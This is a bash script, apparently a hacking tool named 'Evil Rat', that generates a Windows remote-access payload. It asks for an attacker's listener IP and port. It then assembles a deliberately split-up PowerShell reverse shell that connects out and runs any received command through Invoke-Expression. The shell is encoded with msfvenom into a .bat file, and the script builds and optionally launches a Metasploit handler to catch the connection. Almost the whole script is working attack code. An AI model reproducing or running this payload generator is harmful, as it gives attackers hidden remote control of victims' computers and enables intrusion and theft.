#!/usr/bin/env bash
clear
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'
echo -e "${RED}"

echo "   ▄████████  ▄█    █▄   ▄█   ▄█               ▄████████    ▄████████     ███     "
echo "  ███    ███ ███    ███ ███  ███              ███    ███   ███    ███ ▀█████████▄ "
echo "  ███    █▀  ███    ███ ███▌ ███              ███    ███   ███    ███    ▀███▀▀██ "
echo " ▄███▄▄▄     ███    ███ ███▌ ███             ▄███▄▄▄▄██▀   ███    ███     ███   ▀ "
echo "▀▀███▀▀▀     ███    ███ ███▌ ███            ▀▀███▀▀▀▀▀   ▀███████████     ███     "
echo "  ███    █▄  ███    ███ ███  ███            ▀███████████   ███    ███     ███     "
echo "  ███    ███ ███    ███ ███  ███▌    ▄        ███    ███   ███    ███     ███     "
echo "  ██████████  ▀██████▀  █▀   █████▄▄██        ███    ███   ███    █▀     ▄████▀   "
echo "                             ▀                ███    ███                          "
echo " "
echo "                            __             _,-.~^.-.                                    "
echo "                          _// )      _,-.~`         `.                          "
echo "                        .. ( /\.-,-./                 ;                     "
echo "                       / 6                             ;      "
echo "                      /           ,             ,-.     ;    "
echo "                     (,__.--.      \           /        ;   "
echo "                      //    / -.\   |          |         ._________"
echo "                        _.- _/   )  )--...,,,___\     \-----------,)  "
echo "                      ((( ~  _.- .-            __ -.   )         //    "
echo "                            (((               (((---~  .         //      "
echo "                                                               ((________________     "
echo "                                                                ----""""-------------\  "
echo "                                                                                  "
echo "  by: Pr0xy bl4d3 "
echo "  v : 1.1             "
echo "                  "
echo "************************************************************************************** "
echo -e "${NC}"

#Enter the listener IP
echo -e "${RED}Enter the LHOST:"
#Target saved to var1
echo -e "${NC}"

#target is defined as var1
read var1
echo

echo -e "${RED}Enter the LPORT:"
#Target saved to var2

echo -e "${NC}"
#target is defined as var2
read var2
echo

echo -e "${RED}Enter the output fail name:"
#Target saved to var3

echo -e "${NC}"
#target is defined as var3
read var3

echo >> /tmp/rat.txt &>/dev/null
vark="'"$var1"'" #ip in ''
VarL='$hmGuXO='$vark #var+ip''

vard="'"$var2"'" #port in ''
VarP='$jXFgb='$vard #var+port''

echo -e "${RED}"
echo "************************************************************************************** "
echo -e "${BLUE}"
echo Creating payload windows/shell_reverse_tcp ...........................................
echo -e "${NC}"
echo LHOST = $var1
echo LPORT = $var2
echo -e "${RED}"
echo "************************************************************************************** "
VarM='$OeGmpK='
VarM1='New-Object '
VarM11='System.Net.Sock'
VarM111='ets.TCPClient('
VarN='$hmGuXO,$jXFgb);$VXMOY=$OeGmpK.GetStream();[byte[]]$uRhWU=0..65535|%{0};$nxFUFH=([text.encoding]::ASCII).GetBytes('
VarO="'PS '+(Get-Location).Path+'> ');"
VarR='$VXMOY.Write($nxFUFH,0,$nxFUFH.Length);while(($riojM=$VXMOY.Read($uRhWU,0,$uRhWU.Length)) -ne 0){$SaY=([text.encoding]::ASCII).GetString($uRhWU,0,$riojM);try{$nuuojT=(Invoke-Expression -c $SaY 2>&1|Out-String)}catch{Write-Warning '
VarS="'Something went wrong with execution of command on the target.'"
VarT=';Write-Error $_;};$hmGuXO0=$nuuojT+'
VarU="'PS '+(Get-Location).Path+'> ';"
VarZ='$hmGuXO1=($hmGuXO2[0]|Out-String);$hmGuXO2.clear();$hmGuXO0=$hmGuXO0+$hmGuXO1;$nxFUFH=([text.encoding]::ASCII).GetBytes($hmGuXO0);$VXMOY.Write($nxFUFH,0,$nxFUFH.Length);$VXMOY.Flush();};$OeGmpK.Close();if($hmGuXO3){$hmGuXO3.Stop();};'

varF="$VarL;$VarP;$VarM$VarM1$VarM11$VarM111$VarN$VarO$VarR$VarS$VarT$VarU$VarZ"
echo $varF > /tmp/psobfer.bat

{
sudo msfvenom -p generic/custom PAYLOADFILE=/tmp/psobfer.bat -a x86 --platform win -e psbase NOEXIT SYSWOW64 -o /tmp/$var3.bat
} &> /dev/null

sudo cp /tmp/$var3.bat ./output
sudo rm /tmp/$var3.bat
#sudo rm /tmp/psobfer.bat
echo -e "${NC}"
echo -e "${NC}Payload was successfully created and stored as" "${RED}$var3.bat" "${NC}in" "${RED}$PWD/output" "${NC}directory."
echo -e "${RED}"
echo "************************************************************************************** "
echo
echo >> ./evilrat.rc &>/dev/null
echo use multi/handler >> ./evilrat.rc
echo set payload windows/shell_reverse_tcp >> ./evilrat.rc
echo set LHOST $var1 >> ./evilrat.rc
echo set LPORT $var2 >> ./evilrat.rc
echo exploit >> ./evilrat.rc

echo -e "${BLUE}would you like to run a handler?"
echo
echo Enter: [1] Yes or [2] No
echo -e "${NC}"
#generation of report is defined as var. type2
read var4
if [ $var4 -eq 1 ]; then

sudo msfconsole -r evilrat.rc
rm evilrat.rc
fi
if [ $var4 != 1 ]; then

exit 1
fi
